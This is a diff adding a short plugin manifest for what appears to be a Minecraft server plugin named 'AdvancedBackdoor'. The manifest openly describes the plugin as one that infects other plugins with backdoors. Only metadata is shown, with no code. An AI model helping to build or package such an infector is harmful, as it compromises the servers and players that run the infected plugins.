@@ -1,0 +1,6 @@
+name: AdvancedBackdoor
+description: the plugin that infect your plugins as backdoors
+version: 1.0
+author: commandf1
+main: space.commandf1.backdoor.Main
+folia-supported: false
